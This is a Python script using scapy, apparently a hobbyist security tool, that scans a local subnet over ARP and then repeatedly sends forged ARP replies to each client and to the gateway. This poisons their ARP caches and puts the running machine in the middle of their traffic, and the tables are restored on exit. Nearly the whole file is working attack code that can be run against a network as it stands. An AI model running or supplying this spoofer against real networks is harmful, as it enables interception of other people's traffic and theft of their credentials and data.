#!/usr/bin/env python

import scapy.all as scapy
import time
import optparse
import sys

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_request_broadcast = broadcast/arp_request
    answered = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered[0][1].hwsrc

def get_target():
    parser = optparse.OptionParser('usage %prog -t "<target>"')
    parser.add_option("-t", dest="target", type="string", help="specify targets")
    (options, _) = parser.parse_args()

    if not options.target:
        parser.error('[-] You must specify a target.')
        exit(0)

    return options.target

def scan(ip, gateway_ip, machine_ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_request_broadcast = broadcast/arp_request
    answered = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    clients = {}

    for element in answered:
        clients[element[1].psrc] = element[1].hwsrc

    clients.pop(gateway_ip, None)
    clients.pop(machine_ip, None)

    return clients

# op=2  (Response Packet)
# pdst  (IP Address of the Target)
# hwdst (MAC Address of the Target)
# psrc  (IP Address of the router to pretend the answer came from it so the target will associate our MAC address with the router IP)
def spoof(target_ip, target_mac, spoof_ip):
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        scapy.send(packet, verbose=False)

def restore(destination_ip, destination_mac, source_ip, source_mac):
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

gateway_ip = "192.168.0.1"
gateway_mac = get_mac(gateway_ip)

machine_ip = "192.168.0.123"
machine_mac = get_mac(gateway_ip)

target = get_target()
clients = scan(target, gateway_ip, machine_ip)
print("Clients found:\n" + str(clients))

try:
    sent_packets = 0

    while True:
        for target_ip, target_mac in clients.iteritems():
            spoof(target_ip, target_mac, gateway_ip)
            spoof(gateway_ip, gateway_mac, target_ip)
            sent_packets = sent_packets + 2

        print("\r[+] Packets sent: " + str(sent_packets)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Detected CTRL + C ... Restoring ARP tables..... Please wait.")

    for target_ip, target_mac in clients.iteritems():
        restore(target_ip, target_mac, gateway_ip, gateway_mac)
        restore(gateway_ip, gateway_mac, target_ip, target_mac)

    print("[-] ARP tables restored ..... Quitting.")
